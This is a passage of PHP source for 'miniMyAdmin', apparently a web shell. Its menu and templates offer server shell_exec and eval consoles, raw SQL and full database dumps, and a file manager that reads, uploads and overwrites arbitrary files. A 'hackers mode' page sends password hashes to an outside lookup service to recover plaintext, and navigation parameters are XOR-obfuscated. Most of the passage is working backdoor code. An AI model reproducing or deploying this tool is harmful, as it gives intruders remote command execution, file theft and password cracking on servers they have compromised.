				$output .= '<td><input type="checkbox" name="export['.$table['Name'].']" checked="checked"></td>';
				$output .= '<td>'.$table['Name'].'</td>';
				$output .= '<td>'.$table['Rows'].'</td>';
				$output .= '</tr>';
			}
			$output .= '<tr><td colspan="3"><input type="submit" value="export"></td></tr>';
			$output .= '</table>';
			$output .= '</form>';
		}
	}
	return $output;
}


/**
 * Passwords "hacking" page
 *
 * @return string
 */
function action_pwd_hck()
{
	$output = '<h1>password lookup</h1>';
	
	if(!function_exists('fsockopen'))
	{
		$output .= '<p class="error">Seems like fsockopen function is disabled - without it we cant use this.</p>';
	}
	
	$output .= '<p>Enter md5/sha1 password hash and we try to "reverse" it to plaintext (You can generate password hashes on '.html_encode_link('eval() page', self, (array('eval'=>1))).' or ...)</p>';
	$result = '';

	if(!empty($_POST))
	{
		$p = $_POST;
		if(!hack)
		{
			$output .= '<p class="error">sorry, "hackers mode" is disabled</p>';
		}
		else 
		{
			$answer = getpassbyhash($_POST['hash'], $_POST['type']);
			$result = (md5($answer)==$p['hash']) ? 'Password is: <strong>'.$answer .'</strong></p>' : '<p class="error">Password not found :/</p>';
		}
	}
	else
	{
		$p['hash'] = md5('pass');
		$p['type'] = 'md5';
	}
	
	$output .= '<form action="'.self.'" method="post">';
	$output .= html_hidden(array('pwd_hck'=>1));
	$output .= '<p><input type="text" name="hash" size="42" value="'.$p['hash'].'"></p>';
	$output .= $result;
	$output .= html_radio('type', array('md5'=>'md5', 'sha1'=>'sha1'), $p['type']);
	$output .= ' <input type="submit" value="here we go">';
	$output .= '</form>';
	return $output;
}

/**
 * filemanager page
 *
 * @return string
 */
function action_filemanager()
{
	if(isset($_REQUEST['filepath']) && is_readable($_REQUEST['filepath']) && !demo)
	{
		header('Content-Type: ' . getmimetype($_REQUEST['filepath']));
		header('Content-Disposition: filename=' . basename($_REQUEST['filepath']));
		readfile($_REQUEST['filepath']);
		exit;
	}
	
	$output = '<h1>filemanager</h1>';
	
	#$default_dir = dirname(__FILE__);
	$default_dir = '.';

	$current_dir = isset($_REQUEST['dir']) ? $_REQUEST['dir'] : $default_dir;

	#if(demo && is_forbidden($current_dir))
	if(demo && strlen(realpath($current_dir))<strlen(realpath(dirname(__FILE__))))
		$current_dir = $default_dir;

	if(!is_dir($current_dir))
		$current_dir = $default_dir;

	$current_dir = realpath($current_dir);

	if(is_writeable($current_dir) && !demo)
	{
		if(isset($_FILES['uploadfile']))
		{
			if($_FILES['uploadfile']['error']==UPLOAD_ERR_OK && move_uploaded_file($_FILES['uploadfile']['tmp_name'],add_slash_if_needed($current_dir).$_FILES['uploadfile']['name']))
			{
				$output .= '<p class="notice">File has been uploaded.</p>';
			}
			else
			{
				$err = $_FILES['uploadfile']['error'];
				$upload_errors = array(
					UPLOAD_ERR_OK => 'upload ok.',
  					UPLOAD_ERR_INI_SIZE => 'file was bigger than allowed in php.ini',
					UPLOAD_ERR_FORM_SIZE => 'file was bigger that allowed with MAX_FILE_SIZE on form',
					UPLOAD_ERR_PARTIAL => 'upload was partial',
					UPLOAD_ERR_NO_FILE => 'no file',
					6 => 'temp dir not found'
				);
 
				$output .= '<p class="error">Upload failed, err #'.$err.': "'.$upload_errors[$err].'"</p>';
			}
		}
		
		if(isset($_POST['newfilename']) && in_array($_POST['newfiletype'], range(1,2)))
		{
			$newpath = add_slash_if_needed($_REQUEST['dir']).$_POST['newfilename'];
			if($_POST['newfiletype']==1)
			{
				if(touch($newpath))
				{
					$output .= '<p class="notice">File has been created.</p>';
				}
				else
				{
					$output .= '<p class="error">File creating failed.</p>';
				}
			}
			else
			{
				if(mkdir($newpath))
				{
					$output .= '<p class="notice">Folder has been created.</p>';
				}
				else
				{
					$output .= '<p class="error">Error: folder creating failed.</p>';
				}
			}
		}
	}

	$files = $folders = array();
	$d = dir($current_dir);
	if(is_object($d))
	{
		while (false !== ($file = $d->read()))
		{
			$path = add_slash_if_needed($current_dir).$file;
			
			if(is_file($path))
			{
				$files[$path] = $file;
			}
			else 
			{
				$folders[$path] = $file;
			}
		}
		$d->close();
	}
		
	if(demo)
		$output .= '<p class="error">You can browse only current folder and its subfolders in demo mode</p>';
	
	$output .= '<form action="'.self.'" method="post">
	<input type="text" name="dir" value="'.$current_dir.'" size="50">
	<input type="hidden" name="filem" value="1">
	<input type="submit" value=" cd ">
	</form>';

	if(is_writeable($current_dir))
	{
		// upload form
		$output .= '<form action="'.self.'" method="post" enctype="multipart/form-data">';
		$output .= '<input type="file" name="uploadfile">';
		$output .= '<input type="submit" value="upload">';
		$output .= html_hidden(array('dir'=>$current_dir, 'filem'=>1));
		$output .= '</form>';
		
		// new file/folder form
		$output .= '<form action="'.self.'" method="post">';
		$output .= html_selectbox('newfiletype', array(1=>'file', 2=>'folder'),1);
		$output .= '<input type="text" name="newfilename">';
		$output .= html_hidden(array('dir'=>$current_dir, 'filem'=>1)); 
		$output .= '<input type="submit" value="create">';
		$output .= '</form>';
	}
	
	$i = 1;	// flag for css style
	$output .= '<table>';
	$output .= '<tr class="table_header">
		<th>filename</th>
		<th>size</th>
		<th>perms</th>
		<th>how old</th>
		<th>actions</th>
	</tr>';
	if(count($folders))
	{
		natcasesort($folders);
		foreach($folders as $fop=>$fo)
		{
			$i = !$i;
			$row_css = ($i) ? 'class="table_even_row"' : 'class="table_odd_row"';
			$output .= '<tr '.$row_css.'>
				<td>[ '.html_encode_link($fo, self, array('filem'=>1, 'dir'=>add_slash_if_needed($current_dir).$fo)).' ]</td>
				<td>&nbsp;</td>
				<td>'.getperms($fop).'</td>
				<td align="right" title="'.date('Y-m-d H:i:s', filemtime($fop)).'">'. how_old(filemtime($fop)).'</td>
				<td></td>
			</tr>';
		}
	}
	
	if(count($files))
	{
		natcasesort($files);
		foreach($files as $fip=>$fi)
		{
			$i = !$i;
			$row_css = ($i) ? 'class="table_even_row"' : 'class="table_odd_row"';
			$output .= '<tr '.$row_css.'>
				<td>'.html_encode_link($fi, self, array('filem'=>1, 'filepath'=>$fip, 'cmd'=>'view')).'</td>
				<td align="right">'.filesize_format(filesize($fip)).'</td>
				<td>'.getperms($fip).'</td>
				<td align="right" title="'.date('Y-m-d H:i:s', filemtime($fip)).'">'.how_old(filemtime($fip)).'</td>
				<td>'.((is_writeable($fip))?html_encode_link('edit', self, array('editfile'=>1, 'path'=>$fip)):'').'</td>
			</tr>';
		}
	}
	return $output .= '</table>';
}

/**
 * File editor
 *
 * @return string
 */
function action_editfile()
{
	$output = '<h1>file editing: "'.$_REQUEST['path'].'"</h1>';
	if(demo)
	{
		$output .= '<p class="error">file edit is disabled in demo mode</p>';
	}
	elseif(!is_file($_REQUEST['path']))
	{
		$output .= '<p class="error">file not found</p>';
	}
	else
	{
		if(empty($_POST))
		{
			$p = array();
			$p['filecontent'] = file_get_contents($_REQUEST['path']);
		}
		else
		{
			$p = $_POST;
			$f = fopen($_REQUEST['path'], 'w');
			if(is_resource($f))
			{
				fwrite($f, $_REQUEST['filecontent']);
				fclose($f);
			}
			$dirname = dirname($_REQUEST['path']);
			redirect(encode_link(self, array('filem'=>1, 'dir'=>$dirname)));
		}
		
		$output .= '<form action="'.self.'" method="post">';
		$output .= html_hidden(array('editfile'=>1, 'path'=>$_REQUEST['path']));
		$output .= '<textarea rows="20" cols="80" name="filecontent">'.htmlspecialchars($p['filecontent']).'</textarea><br>';
		$output .= '<input value="save" type="submit"> [ '.html_encode_link('back', self, array('filem'=>1, 'dir'=>dirname($_REQUEST['path']))).' ] ';
		$output .= '</form>';
	}
	return $output;
}

/**
 * returns mainmenu
 *
 * @return string
 */
function get_menu()
{
	global $authstr;
	$mysql_menu = '<h2>mysql</h2>';

	if(empty($_SESSION['mysql']))
	{
		$mysql_menu .= '<ul><li>'.html_encode_link('mysql_connect()',self,array('mysql'=>1)).'</li></ul>';
	}
	else
	{
		$mysql_menu .= '<ul>
			<li>'.html_encode_link('visual editor',self,array('mysql'=>4)).'</li>
			<li>'.html_encode_link('raw sql',self,array('mysql'=>3)).'</li>
			<li>'.html_encode_link('export',self,array('mysql'=>5)).'</li>
			<li>'.html_encode_link('mysql_close()',self,array('mysql'=>2)).'</li>
		</ul>';
	}

	return '<h2>info</h2>
		<ul>
		<li>'.html_encode_link('home',self,array()).'</li>
		<li>'.html_encode_link('phpinfo()',self,array('phpinfo'=>1)).'</li>
		</ul>
		<h2>filemanager</h2>
		<ul><li>'.html_encode_link("dir->read()",self,array('filem'=>1)).'</li></ul>
		<h2>php-shell</h2>
		<ul><li>'.html_encode_link('shell_exec()',self,array('shell'=>1)).'</li>
		<li>'.html_encode_link('eval()',self,array('eval'=>1)).'</li></ul>'.
		$mysql_menu.'
		<h2>utils</h2>
		<ul><li>'.html_encode_link('getPassByHash()',self,array('pwd_hck'=>1)).'</li></ul>
		<h2>Settings</h2>
		<ul><li>'.html_encode_link('con figure out',self,array('settings'=>1)).'</li></ul>
		<h2>This Server</h2>
		<ul>
		<li><a href="?dbadmin'.$authstr.'">Reset Server</a></li>
		</ul>';
html;

}

/**
 * gets tables from mysql database and outputs as downloadable sql dump file
 *
 * @param array $tables
 * @return void
 */
function export_tables_now($tables)
{
	if(empty($tables))
		return('$tables should be array');

	$output = '';
	foreach($tables as $table)
	{
		$output .= "--\n-- Dropping table '$table'\n--\n\n";
		$output .= "\nDROP TABLE IF EXISTS `$table`;\n\n";

	
		$create_table = mysql_fetch_row(mysql_query("show create table $table"));

		$output .= "--\n-- Table structure for '$table'\n--\n\n";

		$output .= $create_table[1]."; \n\n";

		$data = mysql_query("select * from $table");

		$recs = 0;
		while ($rd = mysql_fetch_row($data))
		{
			$recs++;

			if ($recs == 1)
         	{
               $output .= "--\n-- Dumping data for table '$table'\n--\n\n";
         	}

         	$output .= "INSERT INTO `$table` VALUES (";

            $kl = 0;
            foreach($rd as $value)
            {
            	$kl++;
				if ($kl > 1)
					$output .=", ";
				$output  .= "'".$value."'";
			}
			$output .= ");\n";
		}
	}

    header("Content-type: text/plain");
    header("Content-disposition: attachment;filename=\"".$_SESSION['mysql']['db'].".sql\"");
    echo  $output;
    exit;
}

/**
 * fetches content from actual password looking service
 *
 * @param string $hash
 * @param string $type
 * @return string
 */
function getpassbyhash($hash, $type)
{
	return fetchURL('http://anna.allkiri.com/getpassbyhash.php?hash='.$hash.'&type='.$type);
}


/**
 * fetches page source from $url
 * 
 * @link http://ee2.php.net/fsockopen#50357
 * @param string $url
 * @return string
 */
function fetchURL( $url ) 
{
	$return = '';
	$url_parsed = parse_url($url);
	$host = $url_parsed["host"];

	$port = (isset($url_parsed['port'])) ? $url_parsed['port'] : 80;
	$path = $url_parsed["path"];

	//if url is http://example.com without final "/"
	//I was getting a 400 error
	if (empty($path))
		$path="/";

	//redirection if url is in wrong format
	if (empty($host)):
		$host="www.somesite.com";
		$path="/404.shtml";
	endif;

	if ($url_parsed["query"] != "")
		$path .= "?".$url_parsed["query"];
	
	$out = "GET $path HTTP/1.0\r\nHost: $host\r\n\r\n";
	
	$fp = fsockopen($host, $port, $errno, $errstr, 30);
	
	if(is_resource($fp))
	{
		fwrite($fp, $out);
		while (!feof($fp)) {
			$return .= fgets($fp, 128);
		}
		fclose($fp);
	}
	$ex = explode("\r\n\r\n", $return, 2);
	return $ex[1];
}


/**
 * sends user to certain url
 *
 * @param string $url
 */
function redirect($url)
{
	header('Location: '.$url);
	die;
}


/**
 * return template named $name
 *
 * @param string $name
 * @return string
 */
function get_tpl($name)
{
	$v = version;
	$s = self;
	
	$templates = array(

'login'=><<<tpl
<fieldset><legend>ho ar yo</legend>
	<form action="$s" method="post">
	<input type="password" name="pass" value="pass" onclick="this.value=''">
	<input type="submit" value="login">
	</form>
</fieldset>
tpl
,
'connect2mysql'=><<<tpl
<fieldset>
		<legend>connect to mysql</legend>
		<VAR:connectmsg>
		<form action="$s" method="post">
		<input type="hidden" name="mysql" value="1">
		<input type="text" title="user" name="mysql[user]" value="user" onclick="this.value=''"><br>
		<input type="password" title="password" name="mysql[pass]" value="pass" onclick="this.value=''"><br>
		<input type="text" title="database" name="mysql[db]" value="db" onclick="this.value=''"><br>
		<input type="text" title="host" name="mysql[host]" value="localhost"><br>
		<input type="submit" value="connect">
		</form>
</fieldset>
tpl
,'html'=><<<tpl
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
   "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<title>minimyadmin</title>
<meta name="author" content="el teh ka, design by: arukyla.com">
<style type="text/css">
html, select, div, p, textarea, input {
   color: #b39a88;
   font-family: Tahoma, Verdana, Arial, Helvetica, sans-serif; 
   font-size: 11px;
}
body {
   margin: 0;
   padding: 0;
}
h1, h2, h3 {margin: 2px; padding: 2px}
h1 {
	font-size: 16px;
}
h2 {
	font-size: 14px;
}
h3 {
	font-size: 12px;
}

#tiitel {
   padding-left: 10px;
   color: #ed7e31;
   font-size: 24px;
   font-variant: small-caps;
   border-bottom: 1px dashed #4f4d4b;
   margin-bottom: 15px;
}

#kogu {
   
}

#keskel {
   background-color: #000;
   height: 398px;
   margin-left: 155px;
   border: 1px dashed #424242;
   text-align: left;
   padding-left: 4px;
   position: relative;
}

#vasak {
   background-color: #987;
   color: #fff;
   width: 150px;

   float: left;
   color: #c3a793;
   position: relative;
}

#sekt {
   color: #9d9d9d;
   width: 150px;
   height: 16px;
   text-align: center;
   font-weight: bold;
   background-color: #171514;
}

#all {
   background-color: #a8acad;
   height: 30px;
   margin-top: 2px;
   color: #fff;
   padding: 7px 0 0 8px;
}
td {vertical-align: top;}
fieldset {
	padding: 10px;
}
form {
	margin:0;
	padding:0;
}
#vasak {
  font-size:13px;
  margin:0;
  padding:0 0 30px 0;
  vertical-align:top;
  border-bottom:1px solid #bbb;
  border-right:1px solid #bbb;
}
#vasak ul {
  list-style: none;
  margin:0;
  padding:0 0 0 20px;
  border: none;
  line-height:130%;
}
#vasak li {
  margin: 0;
  padding: 2px 2px 2px 5px;
  line-height:130%;
  text-transform:lowercase;
/*  list-style-image: url(inc/tpl/img/menu-collapsed.gif);*/
}
#vasak li a {
  display: block;
  color:#ffbf7f;
  text-decoration: none;
  font-weight:normal;
  width:100%;
}
#vasak a:hover {
	color:#066ff;
}
#vasak h2 {
	color:#996533;
	background-color:#bbb;
	font-size:10px;
	text-transform:uppercase;	
	font-weight:bold;
	margin:10px 0 10px 0;
	padding:0;
	text-align:center;
}
.error 
{
	color: red;
	font-weight: bold;
}
.notice
{
	color: green;
	font-weight: bold;
}
.table_header
{
	background-color: #353535;
}
.table_even_row {
	background-color: #555;
}
.table_odd_row {
	background-color: #151515;
}
</style>
<script type="text/javascript">

// Base64 code from Tyler Akins -- http://rumkin.com

var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

function decode64(input) {
   var output = "";
   var chr1, chr2, chr3;
   var enc1, enc2, enc3, enc4;
   var i = 0;

   // remove all characters that are not A-Z, a-z, 0-9, +, /, or =
   input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

   do {
      enc1 = keyStr.indexOf(input.charAt(i++));
      enc2 = keyStr.indexOf(input.charAt(i++));
      enc3 = keyStr.indexOf(input.charAt(i++));
      enc4 = keyStr.indexOf(input.charAt(i++));

      chr1 = (enc1 << 2) | (enc2 >> 4);
      chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
      chr3 = ((enc3 & 3) << 6) | enc4;

      output = output + String.fromCharCode(chr1);

      if (enc3 != 64) {
         output = output + String.fromCharCode(chr2);
      }
      if (enc4 != 64) {
         output = output + String.fromCharCode(chr3);
      }
   } while (i < input.length);

   return output;
}

function CheckAll(vormobj, butobj){
    var flag = butobj.checked ? 1 : 0;
	d=document.getElementsByTagName("input");
	for(i=0;i<d.length;i++)
	{
		if(d[i].type=="checkbox")
		{
			//alert( i);
     		d[i].checked=flag;
		}
	}
}

function toggle(obj) {
	var el = document.getElementById(obj);
	el.style.display = (el.style.display != 'none' ? 'none' : '' );
}
</script>
</head>
<body>

<VAR:body>

</body>
</html>
tpl
, 'mainbody'=><<<tpl
<div id="tiitel"><a href="$s">miniMyAdmin</a></div>
<div id="kogu">
	<div id="vasak">
    	<div id="sekt">menu</div>
		<VAR:menu>
    </div>
	<div id="keskel">
		<VAR:mainbody>
	</div>
</div>
<br style="clear:both">
<div id="all">minimyadmin version $v</div>
tpl
,
'shell'=><<<tpl
<h1>shell</h1>
<VAR:notice>
<p>here you can run shell commands in server</p>
<form action="$s" method="post">
<input type="hidden" name="shell" value="1">
<textarea cols="60" rows="6" name="cmd" id="cmd"><VAR:cmd></textarea><br>
output: <VAR:output_type>
<input type="submit" value="fire!">
</form>
<VAR:cmdlist>
<VAR:result>
tpl
,
'raw_sql_enter'=><<<tpl
<h1>raw sql</h1>
<VAR:notice>
<form action="$s" method="post">
<input type="hidden" name="mysql" value="3">
<textarea cols="60" rows="3" name="sqlcmd" id="sqlcmd"><VAR:sqlcmd></textarea>
<input type="submit" value="fire!"><br>
<VAR:outputtype>
</form>
<VAR:cmdlist>
<VAR:result>
tpl
,
'eval'=><<<tpl
<h1>eval</h1>
<VAR:notice>
<form action="$s" method="post">
<input type="hidden" name="eval" value="1">
<textarea cols="60" rows="6" name="cmd" id="cmd"><VAR:cmd></textarea>
<input type="submit" value="fire!"><br>
</form>
<VAR:cmdlist><br>
<VAR:result><br>
<VAR:exploits>
tpl
);

return $templates[$name];
}

function output_image($name)
{
	$images = array("logo"=>
"iVBORw0KGgoAAAANSUhEUgAAAI4AAAAtCAIAAAD3F8QfAAAABGdBTUEAAK/INwWK6QAAABl0RVh0
U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAkOSURBVHja7FtsFFUYZndndmfbblu6vUFB
5H4JUcEACWrQBDH4gokmBqMPhvgmr/hGCD7JK76iL0big0ZeJAIvRCRBRNQgSrkIltJCL9vu/TK7
9Zv5u4fZM5c9M+y2Xd2TyeSc/5z//Oe//2e2qW9mZmZRszVC8zdF0FRVszVVNU8tevQqnnk8gGQ+
EHU+e2vlvk2dZoRLQ6nXPx+k/sThLRyiESLIvxHLM3VX7ci5B8cvPkTn4M6+I7uXzpfi3bJg61Wn
rk9Zwr++FpsDTupK/aehFNdpiCZZQtf3KKeux87d6tq9pp2bOnF5DLM3xrIc3JuNW2J5oC7e4JeX
hpK087lbcQx3LG+de7l7EJe1V+3btBjvMzfjHPyT86Nstn6trtTJk158OoKnsRzLWlUvr4qQCV+q
5ATGzmbr1+pK/cLdBN4bexU8bNjAARAx4cC2HggLuYHFhxOXxxF5ALeMGJYFAobHLz46fWMaMWfH
8rb3tkb3P9tVNbu6ov72l7cRxz7dt4LbmVAOnR5CrPvqndUs+mExTkIBEB27GAj4t9enTv46gT4W
71nb4cCyJY+IAefvJAQZFxGXZKfDPWvbISyj0VFKf3Ozi/hz6PR9bFIWUxJPi+y3LO08U4cQIdYf
7yXNqro6kqYFDHJtNIP39rJi0MGRAORUdfK3yQ9P3TOqDY8rHnEeD4w7i8u2AoQpISvAkClDoCQD
JiCukjBkfWzvchgLnv3PRQE5a8+zN+oHtnVrwtXNnysfAEQNQguMygOQ1S8MaGxUysODv3t/HU6O
96FdSxx4PLJ7gHgEiu5PI2agCOPO4vI7pvdOliGoehZxCGM7+uoAk9QbOu4vw6JpnDrJAqHDsnyo
cBddecz/0MGQUzP2gYlAUsf2LiPLwPujXf0OPB7c2cuCAd5ANwPNxuRWVVSFiEmmDZHplu5OVcZq
m/ridbY49RdWtJkLBER8JiaWuvDeOlDhl6RLmpr1vAdptqc3Hu2ATyiuKh+WKDccOz/CBf25aYLU
SanGjKIXC9rlycj8jXGN7S1LWirucN0KmzLWmebMt0ArQGMmQD6ngsQY9OemiVPftSqCZRfuzt5t
0TFrl9wONSEeywq+4T/X7tLvMXvXd8zL+QSp02XrzM1pGqLDFRQo6hxiL6awoCHvVcaGjOqQVOvd
BKkj86MQQOomidMNrKJw1zMQqjKW7Y11xJFzw1hAQQ8eDAdFCBXPMQvFqxqlURLChQYPV1CYb1TG
RkBagLa5P4z3leE0dyNuqqqWiY0qbzzse4SxygDQ8lIIIBaTJ7HaD8UFKwvhdofPDjdVVcvG6ggu
t1GVsd3+8r6xN8yWoZ5E8EQIRfVBPyciPG7oCTdArmqkGLh0thDnEhJdh9msHSL7yo7Lb7RFYl/w
UNogX0aPxuaXO99/6S+W6PssfAKyXvSfa7xXfXFV+/7x7paoM5p5GQex3Mcblgh1an881EqDUok3
vu8H42OpwksrIys6g5Yb3pvK//B3oqdVfm3dbIb7fTQzEi8AC8Al7fIz/eGqh6854xyQV1XAJ6Rh
8zIOYrmPNyyRfSh8XRlOrYkqzw+0/PkoSz9HUetrkybThVhatVMVprAnltHw5/vpm+MZIgREPPFs
serha844BzSpyi8kLfMyDmK5jzcskX00l3qUGU0WXlnVjtmRRN6oqv6IPDiencyodhsmckVgYRn6
Q9P5O5PZxS0StL4mGgLkr7Hs3Viu6uFrzjgH5FUliRm2eRkHsdzHG5bIPncmc9+LpfOlD7b36AEt
B7X1t8lMVX0ReSKt4kG9wOECOJZWsYBUhSH2X9EZIj2hbehROsOBi/p1zQOPtRIXf25ZzK7NyziI
5T7esET2WdUV+njPwNBUvlcPYg/i+bGkylSF1hWWEMSmMkWzqgDEhlhAw1S+hGG0JWCDraoevuaM
y2696tZE7uZEdkO3srIrNPdeJUg9limOJAqdYWl5h5aN7sbyU9micUFXi3Q/nh+cyOKxPFhXWYXx
EcNeg5oFD19vr+KvwEG/L1ipTBgdIBPpovMyDmJe4A1LkHosowKyJDIrX3Tyaun+dJ4tGGiXFysB
QjQ/mMICh5OLHL62jJuBvFcFKzX5IF7IFIoA4o3+UsaPyQo4SNDKTNxiiVNHXQAgC27ojMQ1x1pm
+GrR3SoXivnVUYXtQyRuT2Qx5XxykcPXkHFLIO9VcsAnG1bAWjHZpeCNyGC3zAwxL/CAJUgdhUCm
UOppkxeHZxMMOghoyZyWnNiySMgPrIxaMh4gXywBiClDuRgEZCyluj18DRm3BJoCYMCPhyWAnDrT
rgSWdch9bTLqq1iZc+MySwgN44aEgT4g2K0qllvqmMKQ6ansQxKACYOCsQkguUpVpQsabp8hM7Ur
2ubY00EyzjzaAZ9QZlX5mN9RVOnWowqMFH3GuXGZJYSGD5MFmHw5XUMovvaQVBXLLfVpjStfX2Uh
EAkFAMxWKgbFQqm0iKkcHQy5CgL7wMlAC7ERiiR1PkoW7FgGj8wFk5rRaD5qBnJUPIhLMjsdq1kR
VVpDfqLRoQSmlQAgeMKy39JbzUMYxXhKHS8fGsAOxV8VyxV1rdTWtg1w52mR/XCsab1A7yw7W9Cf
yvvU8pcndIALIIcLoqOJArSVqIy6liyDx8m0Opl+zCPuZ9AuBxRh3Fm2qkJM14P4YxF0KgHwlnKj
KlhoCMGkUIJ1K5If5mbc0EFV4tSz+srWoMWvOdAWkcbFnyCKrEX/QnFWVehgCCCHCMUDDnMhVWEf
PONp1ZJlSx51n/ZnMu4sLv7L+j9TWoHbF5EeJlTqhAwhFXcXsMdmn7L5pOa5zQF1xCWtBmmVqA/F
U1/wbDVn2fuXdUkv5PPqDDow1VBlMkSsSORKNFuX09SfOnQDfZNfYR8MXZ1tAf0IIvlnIwM6Zjbg
jzBJmq2PqupOPRTwAV3VdYVOKOBzdbYFpCr6mjujW5/lvaw1GEAkNX8JptLF/IXNuXFYnqmLN2SF
kOSnygIdWVhVgZp6lQdx2ZpK0MaKgtLEgbpSZ+oR19NCaL7mvxipnx80VfU/bc3/W9FUVbPVuv0r
wAAoAaCQVsvoFAAAAABJRU5ErkJggg==");

header('Content-type: image/png');
exit(base64_decode($images[$name]));
}

/**
 * parse_template - asendab muutujas (mis nüüd sisaldab templatefaili sisu) tagid nende
 * 
 * @param string $source - template sisu (näiteks read_template tulemus)
 * @param array $vars - massiiv muutujatest ja nende väärtustest
 * 
 * @return string with html template
 
 * @author Anti Veeranna (duke@struktuur.ee)
 */
function parse_tpl($source,$vars)
{
	// kontrollime, kas $vars argument on ikka array
	if (is_array($vars))
	{
		// tsükkel üle $vars kõigi elementide
		foreach($vars as $key => $value)
		{
			// moodustame tagi nime. Kui $key väärtuseks on näiteks "name",
			// siis tagi nimeks saab "{VAR:name}"
			$tag = "<VAR:" . $key . ">"; 

			// asendame tagi tema väärtusega
			$source = str_replace($tag,$value,$source);
		};
	};

	// tagastame $source, kus tagid on nüüd juba nende väärtustega asendatud
	return $source;
}

/**
 * generates html select dropdown list
 * 
 * @param 	string	$name selectboxi nimi/id
 * @param 	array		$values elemendid
 * @param 	mixed		$selected esiletõstetud valik
 * @param 	array		$attributes lisaatribuudid, nt size või multiple
 *
 * @desc tagastab selectbox'i html koodi
 * 
 * @return 	string	html lähtekood select boxiga
 */
function html_selectbox($name, $values, $selected=NULL, $attributes=array())
{
	$attr_html = '';
	if(is_array($attributes) && !empty($attributes))
	{
		foreach ($attributes as $k=>$v)
		{
			$attr_html .= ' '.$k.'="'.$v.'"';
		}
	}

	$output = '<select name="'.$name.'" id="'.$name.'"'.$attr_html.'>'."\n";
	if(is_array($values) && !empty($values))
	{
		foreach($values as $key=>$value)
		{
			if(is_array($value))
			{
				$output .= '<optgroup label="'.$key.'">'."\n";
				foreach($value as $k=>$v)
				{
					$sel = $selected==$k ? ' selected="selected"' : '';
					$output .= '<option value="'.$k.'"'.$sel.'>'.$v.'</option>'."\n";
				}
				$output .= '</optgroup>'."\n";
			}
			else
			{
				$sel = $selected==$key ? ' selected="selected"' : '';
				$output .= '<option value="'.$key.'"'.$sel.'>'.$value.'</option>'."\n";
			}
		}
	}
	$output .= "</select>\n";

	return $output;
}

/**
 * return html hidden input(s)
 *
 * @param array $items - array with key/values pairs
 * @return string
 */
function html_hidden($items)
{
	$output = '';
	if(is_array($items) && !empty($items))
	{
		foreach($items as $name=>$value)
		{
			$output .= '<input type="hidden" name="'.$name.'" value="'.$value.'">';
		}
	}
	return $output;
}

/**
 * makes html radio input
 *
 * @param string $name - input name
 * @param array $values - array with values
 * @param mixed $selected - selected radio
 * @param string $options - additional options for radio input
 * @return string
 */
function html_radio($name, $values, $selected, $options='')
{
	$return = array();
	if(!empty($values) && is_array($values))
	{
		foreach($values as $k=>$v)
		{
			$checked = ($k == $selected) ? ' checked="checked"' : '';
			$return [] = '<input type="radio" name="'.$name.'" value="'.$k.'" id="'.$name.$k.'"'.$checked .$options.' /><label for="'.$name.$k.'">'.$v.'</label>';
		}
	}

	return join(' ', $return);
}

/**
 * generates encoded url from fived arguments
 *
 * @param string $url
 * @param array $params
 * @return string
 */
function encode_link($url, $params)
{
	$query_string = '';
	if(is_array($params) && !empty($params))
	{
		foreach($params as $k=>$v)
			$query_string_array[] = $k.'='.$v;

		$query_string = join('&', $query_string_array);
	}
	if(strlen($query_string))
	{
		$url_separator = "&";			// For FAF
#		$url_separator = (strpos($url, '?')) ? '&' : '?';
		$url .= $url_separator;
		$url .= 'a='.rawurlencode(messitup($query_string, query_string_pass, 1));
	}
	return $url;
}

/**
 * generates encoded link with html <a> tag
 *
 * @param string $name link text
 * @param string $url
 * @param array $params
 * @param string $options
 * @return string
 */
function html_encode_link($name, $url, $params, $options="")
{
	$url = encode_link($url, $params);
	return sprintf('<a href="%s" title="%s">%s</a>', $url, $url, $name);
}


/**
 * simple XOR encoder/decoder
 * 
 * @link http://ee2.php.net/manual/en/ref.mcrypt.php#54109
 * 
 * @param string $string
 * @param string $key
 * @param int $a
 * @return string
 */
function messitup($string, $key, $a)
{
	if(empty($a))
		$string=base64_decode($string);

	$salida='';
	for($i=0;$i<strlen($string);$i++)
	{
		$char=substr($string,$i,1);
		$keychar=substr($key,($i%strlen($key))-1,1);

		if($a)
			$char=chr(ord($char)+ord($keychar));
		else
			$char=chr(ord($char)-ord($keychar));
	   
	   $salida.=$char;
	}

	if($a)
		$salida=base64_encode($salida);

	return $salida;
}

/*
 * @param  mixed  $array   - lehtedele jaotatav massiiv või elmentide arv
 * @param  int    $perpage - mitut asja ühel leheküljel kuvada
 * @param  string $pagevar - GET muutuja aadressiribal
 * @param  string $pageurl - sprintf formaadis lehekülje aadress
 * @param  string $pageactive-sprintf formaadis tekst aktiivse lehe jaoks
 * @param  string $maxlinks- mitut linki korraga kuvada (orienteeruv suurus)
 */
function pager($array, $perpage, $pagevar='p', $pageurl="?p=__CURRENT_PAGE__", $pageactive="<b>%u</b>", $maxlinks=10)
{
	// jagatavate elementide koguarv
	$total = is_array($array) ? count($array) : intval($array);

	// aktiivne lehekülg
	$page = isset($_GET[$pagevar]) ? $_GET[$pagevar] : 1;

	if($perpage<=0)
		$perpage = 10;

	// lehekülgede koguarv
	$pages = ceil($total / $perpage);
		
	// kui page muutuja on väiksem 1-st või suurem lehtede 
	// koguarvust siis aktiivseks leheks määratakse 1
	if($page > $pages || $page < 1)
		$page = 1;

	// leiame lingiriba alguspunkti
	$halfstart = $page - ($maxlinks / 2);
	$start = $halfstart < 1 ? 1 : $halfstart;

	// leiame lingiriba lõpp-punkti
	$halfend = $page + ($maxlinks / 2);
	$end = $halfend > $pages ? $pages : $halfend;

	// tagastatav massiiv
	$return = array();

	// navigeerimismenüü loome ainult siis kui lehti on vähemalt 1
	if($pages > 1)
	{
		if($page>1)
		{
			$url = str_replace('__CURRENT_PAGE__',1,$pageurl);
			$return['navbar'][] = sprintf('<a href="%s">%s</a>', $url, '|&lt;-');
		}

		for($i=$start; $i<=$end; $i++)
		{
			if($page==$i)
			{
				$return['navbar'][] = sprintf($pageactive, $i);
			}
			else
			{
				$url = str_replace('__CURRENT_PAGE__',$i,$pageurl);
				$return['navbar'][] = sprintf('<a href="%s">%u</a>', $url, $i);
			}
		}
		if($page<$pages)
		{
